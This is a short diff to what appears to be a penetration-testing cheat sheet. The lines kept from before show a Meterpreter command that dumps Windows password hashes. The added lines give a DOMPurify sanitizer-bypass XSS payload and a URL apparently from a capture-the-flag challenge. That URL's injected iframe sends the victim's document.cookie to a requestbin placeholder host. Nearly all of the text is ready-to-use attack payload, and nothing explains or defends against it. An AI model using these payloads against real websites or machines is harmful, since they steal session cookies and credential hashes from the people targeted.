@@ -173,3 +173,10 @@ $ python windows-exploit-suggester.py --database 2019-09-25-mssb.xls --systeminf
 
 # Get hash windows 
 meterpreter > run post/windows/gather/smart_hashdump
+
+
+#XSS bypass Dompurify  
+<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">  
+SigSev2 payload :  
+http://qual-challs.rtfm.re:8080/?layout=<svg></p><style><a%20id="</style><iframe%20src=javascript:document.location=%27[requestbin]?c%27.concat(document.cookie)>">  
+
